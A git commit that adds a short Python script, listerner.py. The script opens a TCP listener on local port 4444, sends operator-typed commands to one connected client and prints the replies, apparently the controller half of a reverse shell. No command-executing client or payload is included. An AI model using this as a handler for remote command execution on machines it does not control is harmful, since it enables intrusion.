f94613c5ff274fb654874682ab7b8da63e254def
pedromand55 <151133698+pedromand55@users.noreply.github.com>
2024-11-13 18:56:04 +0100

    Add files via upload

---
+++ listerner.py
@@ -0,0 +1,21 @@
+import socket
+
+# Set up the listener
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('127.0.0.1', 4444))
+s.listen(1)
+
+# Accept incoming connections
+conn, addr = s.accept()
+
+# Run a command loop
+while True:
+    cmd = input('Enter command: ')
+    if cmd == 'exit':
+        break
+    conn.send(cmd.encode())
+    result = conn.recv(10000)
+    print(result.decode())
+
+# Close the connection
+conn.close()
